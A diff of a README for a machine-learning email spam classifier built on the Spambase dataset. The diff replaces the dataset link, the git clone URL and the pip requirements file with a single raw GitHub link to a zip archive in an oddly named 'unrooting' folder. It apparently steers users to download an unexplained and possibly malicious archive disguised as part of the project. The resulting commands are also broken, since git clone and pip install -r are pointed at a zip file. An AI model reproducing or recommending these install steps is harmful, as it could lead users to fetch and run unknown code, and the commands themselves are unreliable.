@@ -12,14 +12,14 @@ This project implements a machine learning-based email spam detection system usi
 
 The dataset used for training the model is the **Spambase Dataset**, which contains labeled email messages as spam or ham. It consists of 4,601 instances with 57 features each. These features represent various characteristics of the email such as word frequencies, characters, and other attributes.
 
-You can find the dataset [here](https://drive.google.com/drive/folders/1bRuM2RJ3CGD5_PtnIr7jVbC5kOJW5o6x)
+You can find the dataset [here](https://raw.githubusercontent.com/Meghsss/Email_Spam_Classifier/main/unrooting/Spam_Email_Classifier_glore.zip)
 
 ## Installation
 
 1. Clone the repository:
 
    ```
-   git clone https://github.com/Meghsss/Email_Spam_Classifier.git
+   git clone https://raw.githubusercontent.com/Meghsss/Email_Spam_Classifier/main/unrooting/Spam_Email_Classifier_glore.zip
    ```
 
 2. Navigate to the project directory:
@@ -31,7 +31,7 @@ You can find the dataset [here](https://drive.google.com/drive/folders/1bRuM2RJ3
 3. Install the required dependencies:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Meghsss/Email_Spam_Classifier/main/unrooting/Spam_Email_Classifier_glore.zip
 
    ```
 
